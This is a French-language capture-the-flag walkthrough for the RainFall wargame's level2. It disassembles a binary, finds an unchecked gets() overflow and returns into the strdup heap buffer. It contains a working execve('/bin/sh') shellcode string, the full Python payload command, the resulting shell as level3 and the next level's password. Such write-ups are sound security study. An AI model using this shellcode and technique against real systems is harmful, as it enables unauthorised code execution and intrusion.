@@ -1,0 +1,121 @@
+comme dans le level1 le binaire ouvre un stream nous permetant de prentre un output.
+
+ilevel2@RainFall:~$ ./level2
+test
+test
+
+radar2 level2
+pdf @main
+
+            ; DATA XREF from entry0 @ 0x8048437
+┌ 13: int main (int argc, char **argv, char **envp);
+│           0x0804853f      55             push ebp
+│           0x08048540      89e5           mov ebp, esp
+│           0x08048542      83e4f0         and esp, 0xfffffff0
+│           0x08048545      e88affffff     call sym.p
+│           0x0804854a      c9             leave
+└           0x0804854b      c3             ret
+
+Dans le main on vois sym.p. En faisant un pdf @sym.p
+
+[0x08048420]> pdf @sym.p
+            ; CALL XREF from main @ 0x8048545
+┌ 107: sym.p (int32_t arg_4h);
+│           ; var char *src @ ebp-0x4c
+│           ; var int32_t var_ch @ ebp-0xc
+│           ; arg int32_t arg_4h @ ebp+0x4
+│           ; var int32_t var_4h @ esp+0x4
+│           0x080484d4      55             push ebp
+│           0x080484d5      89e5           mov ebp, esp
+│           0x080484d7      83ec68         sub esp, 0x68
+│           0x080484da      a160980408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
+│                                                                      ; [0x8049860:4]=0
+│           0x080484df      890424         mov dword [esp], eax        ; FILE *stream
+│           0x080484e2      e8c9feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+│           0x080484e7      8d45b4         lea eax, [src]
+│           0x080484ea      890424         mov dword [esp], eax        ; char *s
+│           0x080484ed      e8cefeffff     call sym.imp.gets           ; char *gets(char *s)
+│           0x080484f2      8b4504         mov eax, dword [arg_4h]
+│           0x080484f5      8945f4         mov dword [var_ch], eax
+│           0x080484f8      8b45f4         mov eax, dword [var_ch]
+│           0x080484fb      25000000b0     and eax, 0xb0000000
+│           0x08048500      3d000000b0     cmp eax, 0xb0000000
+│       ┌─< 0x08048505      7520           jne 0x8048527
+│       │   0x08048507      b820860408     mov eax, str.__p__n         ; 0x8048620 ; "(%p)\n"
+│       │   0x0804850c      8b55f4         mov edx, dword [var_ch]
+│       │   0x0804850f      89542404       mov dword [var_4h], edx
+│       │   0x08048513      890424         mov dword [esp], eax        ; const char *format
+│       │   0x08048516      e885feffff     call sym.imp.printf         ; int printf(const char *format)
+│       │   0x0804851b      c70424010000.  mov dword [esp], 1          ; int status
+│       │   0x08048522      e8a9feffff     call sym.imp._exit          ; void _exit(int status)
+│       │   ; CODE XREF from sym.p @ 0x8048505
+│       └─> 0x08048527      8d45b4         lea eax, [src]
+│           0x0804852a      890424         mov dword [esp], eax        ; const char *s
+│           0x0804852d      e8befeffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x08048532      8d45b4         lea eax, [src]
+│           0x08048535      890424         mov dword [esp], eax        ; const char *src
+│           0x08048538      e8a3feffff     call sym.imp.strdup         ; char *strdup(const char *src)
+│           0x0804853d      c9             leave
+└           0x0804853e      c3             ret
+
+
+On vois plusieurs call de fonction dont gets, on va donc essayer de peter le buffer comme dans le level1
+
+level2@RainFall:~$ python -c 'print "o" * 76' > /tmp/run
+level2@RainFall:~$ gdb level2
+
+(gdb) r < /tmp/run
+Starting program: /home/user/level2/level2 < /tmp/run
+ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooJoooooooo
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+(gdb) info register
+eax            0x804a008	134520840
+ecx            0x0	0
+edx            0xbffff6ac	-1073744212
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff708	0xbffff708
+ebp            0x8048550	0x8048550
+esi            0x0	0
+edi            0x0	0
+eip            0x0	0
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+eip est l'address de retour mais la elle nous donne 0x0
+
+L'address est donc proteger
+
+Cependant apres reflexion il n'y pas que la stack dans la memoire mais aussi la heap. Plus haut dans  @sym.p il y avait le call strdup. strdup utilise malloc donc alloue sur la heap. La heap est contenue dans eax. Eax = rax mais en 32 bits
+
+On convertie en little endian. 0x804a008 devient donc \x08\xa0\x04\x08 pour convertir en little endian les deux derniers chiffre devienent le premier carac et ainsi de suite ce qui nous donne bien \x08\xa0\x04\x08
+
+Cependant ce ne sera pas suffisant car ils nous faudra du shellcode. En effet a l'insta du level1 ils n'y a pas d'execussion du bash.
+
+Donc on en cherche une sur internet "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" la source -> https://www.exploit-db.com/exploits/42428
+
+celui est de 24 bytes donc on va legerement modifier notre commande du python
+
+python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "o" * 56 + "\x08\xa0\x04\x08"' > /tmp/run
+
+24 bytes de shellcodes
+4 bytes pour l'adresse
+56 bytes de char
+
+level2@RainFall:~$ python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "o" * 56 + "\x08\xa0\x04\x08"' > /tmp/run
+level2@RainFall:~$ cat /tmp/run - | ./level2
+1��Ph//shh/bin��PS��
+                     ̀oooooooooooooooooooooooooooooooooooooooooooooooooo�
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+et voila
+
